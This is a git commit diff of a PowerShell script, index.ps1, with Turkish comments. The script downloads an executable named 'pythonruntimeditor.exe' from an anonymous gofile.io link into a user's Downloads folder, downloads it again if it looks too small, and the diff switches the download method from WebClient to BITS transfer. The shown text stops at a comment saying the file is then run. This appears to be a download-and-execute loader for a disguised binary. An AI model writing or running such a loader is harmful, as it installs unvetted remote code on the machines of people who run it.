cdd2856ebda7f73b2f827a4358eb89a9459ac01d
doguiaste <143461390+doguiaste@users.noreply.github.com>
2025-04-21 07:23:30 +0300

    Update index.ps1

--- index.ps1
+++ index.ps1
@@ -1,19 +1,17 @@
-# WebClient ile dosya indir
 $exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
 $localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
 
-# WebClient ile dosya indir
-$webClient = New-Object System.Net.WebClient
-$webClient.DownloadFile($exeUrl, $localPath)
+# BITS ile dosya indir
+Start-BitsTransfer -Source $exeUrl -Destination $localPath
 
-# İndirilen dosya kontrolü
+# Dosya kontrolü
 $fileSize = (Get-Item $localPath).length
-$expectedSize = 46000  # 46 KB'lik dosya için
+$expectedSize = 46000  # 46 KB
 
 if ($fileSize -lt $expectedSize) {
-    Write-Host "Dosya boyutu hatalı. Yeniden indiriyorum..."
+    Write-Host "Dosya boyutu hatalı, tekrar indiriyorum..."
     Remove-Item $localPath -Force
-    $webClient.DownloadFile($exeUrl, $localPath)
+    Start-BitsTransfer -Source $exeUrl -Destination $localPath
 }
 
 # Dosyayı çalıştır
